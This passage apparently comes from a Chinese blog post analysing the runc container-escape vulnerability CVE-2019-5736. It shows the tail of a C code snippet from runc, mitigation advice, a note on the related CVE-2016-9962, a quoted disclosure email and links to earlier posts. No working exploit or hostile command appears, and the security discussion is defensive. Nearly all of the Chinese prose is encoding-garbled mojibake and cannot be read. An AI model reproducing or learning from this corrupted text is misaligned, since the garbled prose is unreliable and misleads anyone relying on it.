    //æ‰§è¡Œè¯¥å¤åˆ¶çš„åŒ¿åæ–‡ä»¶
    fexecve(execfd, argv, environ);
    error:
    close(execfd);
    return -ENOEXEC;
}    
```

## ä¿®è¡¥å»ºè®®
- æ›´æ–°dockerï¼Œä½¿ç”¨æœ€æ–°ç‰ˆæœ¬çš„runc
- æ‰§è¡Œ`docker exec`å‘½ä»¤å¯åŠ¨å®¹å™¨æ—¶ï¼Œå¼€å¯`SELinux`é€‰é¡¹ï¼Œé™åˆ¶å®¹å™¨å†…éƒ¨è¿›ç¨‹å¯è®¿é—®çš„èµ„æº
- è®¾ç½®å®¿ä¸»æœºä¸Šçš„runcäºŒè¿›åˆ¶æ–‡ä»¶ä¸ºåªè¯»
- å°½é‡é¿å…ç»™äºˆå®¹å™¨ç”¨æˆ·å®¹å™¨å†…éƒ¨çš„rootæƒé™

## PS

è¿™é‡Œè¿˜æœ‰å¦ä¸€ä¸ªç‚¹æƒ³è®°ä¸€ä¸‹ã€‚æˆ‘ä¸€å¼€å§‹æ€»æƒ³ï¼Œæ—¢ç„¶è¿›å…¥`pid`å‘½åç©ºé—´ä¹‹åï¼Œå°±å¯ä»¥é€šè¿‡`/proc/`çœ‹åˆ°ï¼Œé‚£ä¸ºä»€ä¹ˆä¸ç›´æ¥åœ¨`runc init`è¿›ç¨‹çš„`esexec()`å‡½æ•°æ‰§è¡Œå®Œä¹‹åå°±å¼€å§‹è¿›è¡Œpocé‡Œé¢çš„æ”»å‡»æ“ä½œå‘¢ã€‚åæ¥æˆ‘ç»è¿‡æŸ¥æ‰¾èµ„æ–™å‘ç°ï¼Œç¡®å®æœ‰[åˆ«çš„åšå®¢](https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/)è¯´è¿‡è¿™ä¸ªé—®é¢˜ï¼Œå¹¶ä¸”è¯´æ˜å…¶å®åœ¨æ›´æ—©æœŸçš„runcç‰ˆæœ¬ä¸­ï¼Œå°±æ˜¯å­˜åœ¨è¿™ä¸€æ¼æ´çš„ã€‚æ”»å‡»è€…ç¡®å®å¯ä»¥åœ¨`runc init`è¿›å…¥å‘½åç©ºé—´ä¹‹åå°è¯•ä¿®æ”¹å®¿ä¸»æœºä¸Šçš„runcæ–‡ä»¶ï¼Œè¿™ä¸€é—®é¢˜ä¹Ÿè¢«åˆ†å‘äº†ä¸€ä¸ªcveï¼Œç¼–å·ä¸º[CVE-2016-9962](https://bugzilla.suse.com/show_bug.cgi?id=1012568)ã€‚ä½†æ˜¯ç”±äº`nsexec()`ä¸æœ€åçš„`system.Exec()`è¿›ç¨‹æ›¿æ¢ä¹‹é—´çš„æ—¶é—´çª—æ ¼è¾ƒå°ï¼Œæ‰€ä»¥æ”»å‡»éš¾åº¦è¾ƒå¤§ï¼Œè¯¥æ¼æ´çš„ä¸¥é‡ç¨‹åº¦ä¹Ÿå¹¶æ²¡æœ‰é‚£ä¹ˆçš„é«˜ã€‚

>
> From: Aleksa Sarai
> 
> runC passes a file descriptor from the host's filesystem to the "runc
> init" bootstrap process when joining a container. This allows a
> malicious process inside a container to gain access to the host
> filesystem with its current privilege set. **Due to the race window
> between join-and-execve being quite small, this bug is quite hard to
> exploit.** A similar, though mostly unrelated, exploit was discovered in
> LXC[\[1\]](http://www.openwall.com/lists/oss-security/2016/11/23/6).
> 

## å¾€æœŸå›é¡¾
- [docker-runc(CVE-2019-5736)æ¼æ´åˆ†æ](https://liuliuliuzy.github.io/posts/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/)
- [docker-runc(CVE-2019-5736)æ¼æ´åˆ†æ-ç¬¬äºŒç‰ˆ](https://liuliuliuzy.github.io/posts/2021-04-27-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%BA%8C%E7%89%88/)
